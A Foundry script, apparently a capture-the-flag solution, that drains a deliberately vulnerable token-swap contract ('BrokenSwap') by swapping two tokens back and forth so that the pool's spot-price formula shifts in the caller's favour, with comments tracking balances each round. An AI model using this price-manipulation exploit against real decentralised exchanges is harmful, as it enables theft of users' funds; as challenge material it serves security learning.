  // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";

interface BrokenSwap {

  function swap(address from, address to, uint amount) external;

  function getSwapPrice(address from, address to, uint amount) external view returns(uint);

  function approve(address spender, uint amount) external;

  function balanceOf(address token, address account) external view returns (uint);
}

contract Solution is Test {
    address payable me = payable(0x92199EeC69Dd43c04103e49D3446052117A12C8a);
    address payable inst = payable(0x11973F9e335342F032809f55C6DEF3d37B001123);
    
    address token1 = 0x66E8EE9BF202a88b74aB354a7Bb2f51bCF7Ae1a2;
    address token2 = 0xEA15B5Ab75317f65E930290AA2A3A2c9aD52aC03;

    function test_run() public {
        uint pk = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(pk);

        // console.log(testContract.balance);
        BrokenSwap s = BrokenSwap(inst);
        console.log("me", s.balanceOf(token1, me), s.balanceOf(token2, me));
        console.log("contract", s.balanceOf(token1, inst), s.balanceOf(token2, inst));
        
        // 10 10, 100 100
        // 0  20, 110  90 (it1)
        // 24  0,  86 110
        // 0  30, 110  80 (it2)
        // 41  0,  69 110
        // ...
        
        uint256 maxSwap;
        for (uint256 i = 0; i < 3; i++) {
            console.log(i);
            maxSwap = min(s.balanceOf(token1, me), s.balanceOf(token1, inst));
            s.approve(inst, maxSwap);
            s.swap(token1, token2, maxSwap);
        
            maxSwap = min(s.balanceOf(token2, me), s.balanceOf(token2, inst));
            s.approve(inst, maxSwap);
            s.swap(token2, token1, maxSwap);
            
            console.log("me", s.balanceOf(token1, me), s.balanceOf(token2, me));
            console.log("contract", s.balanceOf(token1, inst), s.balanceOf(token2, inst));
        }

        vm.stopBroadcast();
    }
    
    function min(uint256 a, uint256 b) private pure returns(uint256) {
        return a <= b ? a : b;
    }
}
